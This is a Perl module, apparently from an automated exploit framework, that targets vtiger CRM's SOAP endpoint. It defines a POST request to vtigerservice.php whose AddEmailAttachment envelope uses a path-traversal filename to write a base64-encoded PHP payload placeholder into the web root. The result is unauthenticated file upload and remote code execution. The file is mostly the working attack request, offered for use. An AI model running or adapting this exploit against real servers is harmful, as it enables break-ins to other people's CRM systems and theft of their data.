MSFExploits/outlook/MSF/VtigerSoapUpload.pm

package MSFExploits::outlook::MSF::VtigerSoapUpload;
# # # use parent qw(MSFExploits::Exploit MSFExploits::Services::outlook);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # # use MSFExploits::Functions::Basic;
# # # use MSFExploits::Functions::Errors;
# # # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "VtigerSoapUpload";

   my $DETECTION = {

   };

   my $EXPLOIT = {
  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'vtigerservice.php',
      PAYLOAD      => '<soapenv:Envelope xmlns:crm=\'http://www.vtiger.com/products/crm\' xmlns:soapenv=\'http://schemas.xmlsoap.org/soap/envelope/\' xmlns:xsd=\'http://www.w3.org/2001/XMLSchema\' xmlns:xsi=\'http://www.w3.org/2001/XMLSchema-instance\'><soapenv:Header/><soapenv:Body><crm:AddEmailAttachment soapenv:encodingStyle=\'http://schemas.xmlsoap.org/soap/encoding/\'><emailid xsi:type=\'xsd:string\'>IucHx</emailid><filedata xsi:type=\'xsd:string\'>PD9waHAgX19QQVlMT0FEX18gPz4=</filedata><filename xsi:type=\'xsd:string\'>../../../../../../KMtHWCzXyXS.php</filename><filesize xsi:type=\'xsd:string\'>20</filesize><filetype xsi:type=\'xsd:string\'>php</filetype><username xsi:type=\'xsd:string\'>xkaVjJk</username><session xsi:type=\'xsd:string\'/></crm:AddEmailAttachment></soapenv:Body></soapenv:Envelope>',
      TEXT   => 'Sending Exploit #1 Request : [POST] /vtigerservice.php',
      HEADERS      => {
        'Content-Type' => 'text/xml; charset=UTF-8',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
